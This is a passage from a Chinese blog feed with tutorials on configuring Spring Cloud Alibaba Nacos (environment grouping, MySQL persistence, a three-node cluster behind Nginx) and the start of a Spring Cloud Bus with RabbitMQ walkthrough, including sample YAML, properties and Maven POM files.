title="Nacos之DataID配置"></a>Nacos之DataID配置</h2><p>指定spring.profile.active和配置文件的DatalD来使不同环境下读取不同的配置</p><p>默认空间+默认分组+新建dev和test两个DatalD</p><ul><li>新建dev配置DatalD</li></ul><p><img src="../img/Nacos/Nacos10.png" alt=""></p><ul><li>新建test配置DatalD</li></ul><p><img src="../img/Nacos/Nacos11.png" alt=""></p><p>通过spring.profile.active属性就能进行多环境下配置文件的读取</p><p><img src="../img/Nacos/Nacos12.png" alt=""></p><p><strong>测试</strong></p><ul><li><a href="http://localhost:3377/config/info" target="_blank" rel="noopener">http://localhost:3377/config/info</a></li><li>配置是什么就加载什么 test/dev</li></ul><h2 id="Nacos之Group分组方案"><a href="#Nacos之Group分组方案" class="headerlink" title="Nacos之Group分组方案"></a>Nacos之Group分组方案</h2><p>通过Group实现环境区分 - 新建Group</p><h3 id="新建配置"><a href="#新建配置" class="headerlink" title="新建配置"></a>新建配置</h3><p><img src="../img/Nacos/Nacos13.png" alt=""></p><p>在nacos图形界面控制台上面新建配置文件DatalD</p><p><img src="../img/Nacos/Nacos14.png" alt=""></p><p>bootstrap+application</p><p>在config下增加一条group的配置即可。可配置为DEV_GROUP或TEST GROUP</p><p><img src="../img/Nacos/Nacos15.png" alt=""></p><h2 id="Nacos之Namespace空间方案"><a href="#Nacos之Namespace空间方案" class="headerlink" title="Nacos之Namespace空间方案"></a>Nacos之Namespace空间方案</h2><p>新建dev/test的Namespace</p><p><img src="../img/Nacos/Nacos16.png" alt=""></p><p>回到服务管理-服务列表查看</p><p><img src="../img/Nacos/Nacos17.png" alt=""></p><p>按照域名配置填写</p><p><img src="../img/Nacos/Nacos18.png" alt=""></p><p>YML</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nacos配置</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3377</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos-config-client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#Nacos服务注册中心地址</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#Nacos作为配置中心地址</span></span><br><span class="line">        <span class="attr">file-extension:</span> <span class="string">yaml</span> <span class="comment">#指定yaml格式的配置</span></span><br><span class="line">        <span class="attr">group:</span> <span class="string">DEV_GROUP</span></span><br><span class="line">        <span class="attr">namespace:</span> <span class="string">7d8f0f5a-6a53-4785-9686-dd460158e5d4</span> <span class="comment">#&lt;------------指定namespace</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># $&#123;spring.application.name&#125;-$&#123;spring.profile.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;</span></span><br><span class="line"><span class="comment"># nacos-config-client-dev.yaml</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nacos-config-client-test.yaml   ----&gt; config.info</span></span><br></pre></td></tr></table></figure><h2 id="Nacos集群-架构说明"><a href="#Nacos集群-架构说明" class="headerlink" title="Nacos集群_架构说明"></a>Nacos集群_架构说明</h2><blockquote><p><a href="https://nacos.io/zh-cn/docs/cluster-mode-quick-start.html" target="_blank" rel="noopener">官方文档</a></p><p>官网架构图</p><p>集群部署架构图</p><p>因此开源的时候推荐用户把所有服务列表放到一个vip下面，然后挂到一个域名下面</p><p><a href="http://ip1:port/openAPI直连ip模式，机器挂则需要修改ip才可以使用。">http://ip1:port/openAPI直连ip模式，机器挂则需要修改ip才可以使用。</a></p><p><a href="http://VIP:port/openAPI挂载VIP模式，直连vip即可，下面挂server真实ip，可读性不好。">http://VIP:port/openAPI挂载VIP模式，直连vip即可，下面挂server真实ip，可读性不好。</a></p><p><a href="http://nacos.com:port/openAPI域名＋VIP模式，可读性好，而且换ip方便，推荐模式">http://nacos.com:port/openAPI域名＋VIP模式，可读性好，而且换ip方便，推荐模式</a></p><p><img src="../img/Nacos/Nacos19.png" alt=""></p></blockquote><p>上图官网翻译，真实情况</p><p><img src="../img/Nacos/Nacos20.png" alt=""></p><p>按照上述，<strong>我们需要mysql数据库</strong>。</p><blockquote><p><a href="https://nacos.io/zh-cn/docs/deployment.html" target="_blank" rel="noopener">官网说明</a></p><p>默认Nacos使用嵌入式数据库实现数据的存储。所以，如果启动多个默认配置下的Nacos节点，数据存储是存在一致性问题的。为了解决这个问题，Nacos采用了集中式存储的方式来支持集群化部署，目前只支持MySQL的存储。</p><p>Nacos支持三种部署模式</p><p>单机模式-用于测试和单机试用。<br>集群模式-用于生产环境，确保高可用。<br>多集群模式-用于多数据中心场景。<br>Windows</p><p>cmd startup.cmd或者双击startup.cmd文件</p><p>单机模式支持mysql</p><p>在0.7版本之前，在单机模式时nacos使用嵌入式数据库实现数据的存储，不方便观察数据存储的基本情况。0.7版本增加了支持mysql数据源能力，具体的操作步骤:</p><p>安装数据库，版本要求:5.6.5+<br>初始化mysq数据库，数据库初始化文件: nacos-mysql.sql<br>修改conf/application.properties文件，增加支持mysql数据源配置（目前只支持mysql)，添加mysql数据源的url、用户名和密码。</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;spring.datasource.platform</span>=<span class="string">mysql</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;db.num</span>=<span class="string">1</span></span><br><span class="line"><span class="meta">&gt;db.url.0</span>=<span class="string">jdbc:mysql://11.162.196.16:3306/nacos_devtest?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true</span></span><br><span class="line"><span class="meta">&gt;db.user</span>=<span class="string">nacos_devtest</span></span><br><span class="line"><span class="meta">&gt;db.password</span>=<span class="string">youdontknow</span></span><br></pre></td></tr></table></figure><p>再以单机模式启动nacos，nacos所有写嵌入式数据库的数据都写到了mysql。</p></blockquote><h2 id="Nacos持久化切换配置"><a href="#Nacos持久化切换配置" class="headerlink" title="Nacos持久化切换配置"></a>Nacos持久化切换配置</h2><p>Nacos默认自带的是嵌入式数据库derby，nacos的pom.xml中可以看出。</p><p>derby到mysql切换配置步骤：</p><ol><li>nacos-server-1.1.4\nacos\conf录下找到nacos-mysql.sql文件，执行脚本。</li><li>nacos-server-1.1.4\nacos\conf目录下找到application.properties，添加以下配置（按需修改对应值）。</li></ol><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">spring.datasource.platform</span>=<span class="string">mysql</span></span><br><span class="line"></span><br><span class="line"><span class="meta">db.num</span>=<span class="string">1</span></span><br><span class="line"><span class="meta">db.url.0</span>=<span class="string">jdbc:mysql://localhost:3306/nacos_devtest?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true</span></span><br><span class="line"><span class="meta">db.user</span>=<span class="string">root</span></span><br><span class="line"><span class="meta">db.password</span>=<span class="string">1234</span></span><br></pre></td></tr></table></figure><p>启动Nacos，可以看到是个全新的空记录界面，以前是记录进derby。</p><h2 id="Nacos之Linux版本安装"><a href="#Nacos之Linux版本安装" class="headerlink" title="Nacos之Linux版本安装"></a>Nacos之Linux版本安装</h2><p>预计需要，1个Nginx+3个nacos注册中心+1个mysql</p><blockquote><p>请确保是在环境中安装使用:</p><ol><li>64 bit OS Linux/Unix/Mac，推荐使用Linux系统。</li><li>64 bit JDK 1.8+；<a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">下载</a>.<a href="https://docs.oracle.com/cd/E19182-01/820-7851/inst_cli_jdk_javahome_t/" target="_blank" rel="noopener">配置</a>。</li><li>Maven 3.2.x+；<a href="https://maven.apache.org/download.cgi" target="_blank" rel="noopener">下载</a>.<a href="https://maven.apache.org/settings.html" target="_blank" rel="noopener">配置</a>。</li><li>3个或3个以上Nacos节点才能构成集群。</li></ol></blockquote><p>Nacos下载Linux版</p><ul><li><a href="https://github.com/alibaba/nacos/releases/tag/1.1.4" target="_blank" rel="noopener">https://github.com/alibaba/nacos/releases/tag/1.1.4</a></li><li>nacos-server-1.1.4.tar.gz 解压后安装</li></ul><h2 id="Nacos集群配置"><a href="#Nacos集群配置" class="headerlink" title="Nacos集群配置"></a>Nacos集群配置</h2><h3 id="Nacos集群配置步骤"><a href="#Nacos集群配置步骤" class="headerlink" title="Nacos集群配置步骤:"></a>Nacos集群配置步骤:</h3><p>1、<strong>Linux服务器上mysql数据库配置</strong></p><p>SQL脚本在 - 目录nacos/conf/nacos-mysql.sql</p><p><img src="../img/Nacos/Nacos21.png" alt=""></p><p>自己Linux机器上的Mysql数据库上运行</p><p><strong>2.application.properties配置</strong></p><p>位置</p><p><img src="../img/Nacos/Nacos22.png" alt=""></p><p>添加以下内容，设置数据源</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">spring.datasource.platform=mysql</span></span><br><span class="line"></span><br><span class="line"><span class="string">db.num=1</span></span><br><span class="line"><span class="string">db.url.0=jdbc:mysql://localhost:3306/nacos_devtest?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true</span></span><br><span class="line"><span class="string">db.user=root</span></span><br><span class="line"><span class="string">db.password=1234</span></span><br></pre></td></tr></table></figure><p><strong>3.Linux服务器上nacos的集群配置cluster.conf</strong></p><p>梳理出3台nacos集器的不同服务端口号，设置3个端口：</p><ul><li>3333</li><li>4444</li><li>5555</li></ul><p>复制出cluster.conf</p><p><img src="../img/Nacos/Nacos23.png" alt=""></p><p>内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.111.144:3333</span><br><span class="line">192.168.111.144:4444</span><br><span class="line">192.168.111.144:5555</span><br></pre></td></tr></table></figure><p><strong>注意</strong>，这个IP不能写127.0.0.1，必须是Linux命令<code>hostname -i</code>能够识别的IP</p><p><img src="../img/Nacos/Nacos24.png" alt=""></p><p><strong>4.编辑Nacos的启动脚本startup.sh，使它能够接受不同的启动端口</strong></p><p>/mynacos/nacos/bin目录下有startup.sh</p><p><img src="../img/Nacos/Nacos25.png" alt=""></p><p>平时单机版的启动，都是./startup.sh即可</p><p>但是，集群启动，我们希望可以类似其它软件的shell命令，传递不同的端口号启动不同的nacos实例。<br>命令: ./startup.sh -p 3333表示启动端口号为3333的nacos服务器实例，和上一步的cluster.conf配置的一致。</p><p>修改内容</p><p><img src="../img/Nacos/Nacos26.png" alt=""></p><p><img src="../img/Nacos/Nacos27.png" alt=""></p><p>执行方式 - <code>startup.sh - p 端口号</code></p><p><img src="../img/Nacos/Nacos28.png" alt=""></p><p><strong>5.Nginx的配置，由它作为负载均衡器</strong></p><p>修改nginx的配置文件 - nginx.conf</p><p><img src="../img/Nacos/Nacos29.png" alt=""></p><p>修改内容</p><p><img src="../img/Nacos/Nacos30.png" alt=""></p><p>按照指定启动</p><p><img src="../img/Nacos/Nacos31.png" alt=""></p><p><strong>6.截止到此处，1个Nginx+3个nacos注册中心+1个mysql</strong></p><p><strong>测试</strong></p><ul><li><p>启动3个nacos注册中心</p><ul><li>startup.sh - p 3333</li><li>startup.sh - p 4444</li><li>startup.sh - p 5555</li><li>查看nacos进程启动数ps -ef | grep nacos | grep -v grep | wc -l</li></ul></li><li><p>启动nginx</p><ul><li>./nginx -c /usr/local/nginx/conf/nginx.conf</li><li>查看nginx进程ps - ef| grep nginx<br>测试通过nginx，访问nacos - <a href="http://192.168.111.144:1111/nacos/#/logi" target="_blank" rel="noopener">http://192.168.111.144:1111/nacos/#/logi</a></li></ul></li></ul><ul><li>新建一个配置测试</li></ul><p><img src="../img/Nacos/Nacos32.png" alt=""></p><ul><li>新建后，可在linux服务器的mysql新插入一条记录</li></ul><p><code>select * from config;</code></p><p><img src="../img/Nacos/Nacos33.png" alt=""></p><ul><li>让微服务cloudalibaba-provider-payment9002启动注册进nacos集群 - 修改配置文件</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9002</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos-payment-provider</span></span><br><span class="line">  <span class="attr">c1oud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="comment">#配置Nacos地址</span></span><br><span class="line">        <span class="comment">#server-addr: Localhost:8848</span></span><br><span class="line">        <span class="comment">#换成nginx的1111端口，做集群</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">192.168</span><span class="number">.111</span><span class="number">.144</span><span class="string">:1111</span></span><br><span class="line"></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">inc1ude:</span> <span class="string">'*'</span></span><br></pre></td></tr></table></figure><ul><li>启动微服务cloudalibaba-provider-payment9002</li><li>访问nacos，查看注册结果</li></ul><p><img src="../img/Nacos/Nacos34.png" alt=""></p><p><strong>高可用小总结</strong></p><p><img src="../img/Nacos/Nacos35.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> spring cloud </tag>
            
            <tag> Nacos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bus消息总线</title>
      <link href="/2021/09/20/bus%E6%B6%88%E6%81%AF%E6%80%BB%E7%BA%BF/"/>
      <url>/2021/09/20/bus%E6%B6%88%E6%81%AF%E6%80%BB%E7%BA%BF/</url>
      
        <content type="html"><![CDATA[<h3 id="Bus消息总线是什么"><a href="#Bus消息总线是什么" class="headerlink" title="Bus消息总线是什么"></a>Bus消息总线是什么</h3><p>config组件的加深和扩充</p><p>一言以蔽之，分布式自动刷新配置功能。</p><p>Spring Cloud Bus配合Spring Cloud Config使用可以实现配置的动态刷新。</p><p>是什么</p><p>Spring Cloud Bus 配合Spring Cloud Config 使用可以实现配置的动态刷新。<br><img src="/img/springcloud2020/bus0.png" alt=""></p><p>Spring Cloud Bus是用来将分布式系统的节点与轻量级消息系统链接起来的框架，它整合了Java的事件处理机制和消息中间件的功能。Spring Clud Bus目前支持RabbitMQ和Kafka。</p><p>能干嘛</p><p>Spring Cloud Bus能管理和传播分布式系统间的消息，就像一个分布式执行器，可用于广播状态更改、事件推送等，也可以当作微服务间的通信通道。</p><p><img src="/img/springcloud2020/bus1.png" alt=""></p><p>为何被称为总线</p><p>什么是总线</p><p>在微服务架构的系统中，通常会使用轻量级的消息代理来构建一个共用的消息主题，并让系统中所有微服务实例都连接上来。由于该主题中产生的消息会被所有实例监听和消费，所以称它为消息总线。在总线上的各个实例，都可以方便地广播一些需要让其他连接在该主题上的实例都知道的消息。</p><p>基本原理</p><p>ConfigClient实例都监听MQ中同一个topic(默认是Spring Cloud Bus)。当一个服务刷新数据的时候，它会把这个信息放入到Topic中，这样其它监听同一Topic的服务就能得到通知，然后去更新自身的配置。</p><h3 id="Bus之RabbitMQ环境配置"><a href="#Bus之RabbitMQ环境配置" class="headerlink" title="Bus之RabbitMQ环境配置"></a>Bus之RabbitMQ环境配置</h3><ul><li><p>安装Erlang，下载地址：<a href="http://erlang.org/download/otp_win64_21.3.exe" target="_blank" rel="noopener">http://erlang.org/download/otp_win64_21.3.exe</a></p></li><li><p>安装RabbitMQ，下载地址：<a href="https://github.com/rabbitmq/rabbitmq-server/releases/download/v3.8.3/rabbitmq-server-3.8.3.exe" target="_blank" rel="noopener">https://github.com/rabbitmq/rabbitmq-server/releases/download/v3.8.3/rabbitmq-server-3.8.3.exe</a></p></li><li><p>打开cmd进入RabbitMQ安装目录下的sbin目录，如：D:\devSoft\RabbitMQ Scrverk\rabbitmq_server-3.7.14\sbin</p></li><li><p>输入以下命令启动管理功能</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmq-plugins enable rabbitmq _management</span><br></pre></td></tr></table></figure><p>这样就可以添加可视化插件。</p><ul><li>访问地址查看是否安装成功：<a href="http://localhost:15672/" target="_blank" rel="noopener">http://localhost:15672/</a></li><li>输入账号密码并登录：guest guest</li></ul><h3 id="Bus动态刷新全局广播的设计思想和选型"><a href="#Bus动态刷新全局广播的设计思想和选型" class="headerlink" title="Bus动态刷新全局广播的设计思想和选型"></a>Bus动态刷新全局广播的设计思想和选型</h3><p>必须先具备良好的RabbitMQ环境先</p><p>演示广播效果，增加复杂度，再以3355为模板再制作一个3366</p><p>1.新建cloud-config-client-3366</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>LearnCloud<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.lun.springcloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud-config-client-3366<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--添加消息总线RabbitMQ支持--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-bus-amqp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>yml</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3366</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">config-client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="comment">#Config客户端配置</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">label:</span> <span class="string">master</span> <span class="comment">#分支名称</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">config</span> <span class="comment">#配置文件名称</span></span><br><span class="line">      <span class="attr">profile:</span> <span class="string">dev</span> <span class="comment">#读取后缀名称   上述3个综合：master分支上config-dev.yml的配置文件被读取http://config-3344.com:3344/master/config-dev.yml</span></span><br><span class="line">      <span class="attr">uri:</span> <span class="string">http://localhost:3344</span> <span class="comment">#配置中心地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rabbitmq相关配置 15672是Web管理界面的端口；5672是MQ访问的端口</span></span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">5672</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">guest</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">guest</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#服务注册到eureka地址</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露监控端点</span></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">"*"</span></span><br></pre></td></tr></table></figure><p><strong>设计思想</strong></p><p>1.利用消息总线触发一个客户端/bus/refresh,而刷新所有客户端的配置</p><p><img src="/img/springcloud2020/bus2.png" alt=""></p><p>2.利用消息总线触发一个服务端ConfigServer的/bus/refresh端点，而刷新所有客户端的配置</p><p><img src="/img/springcloud2020/bus3.png" alt=""></p><p>图二的架构显然更加适合，图—不适合的原因如下：</p><ul><li><p>打破了微服务的职责单一性，因为微服务本身是业务模块，它本不应该承担配置刷新的职责。</p></li><li><p>破坏了微服务各节点的对等性。</p></li><li><p>有一定的局限性。例如，微服务在迁移时，它的网络地址常常会发生变化，此时如果想要做到自动刷新，那就会增加更多的修改。</p></li></ul><h3 id="Bus动态刷新全局广播配置实现"><a href="#Bus动态刷新全局广播配置实现" 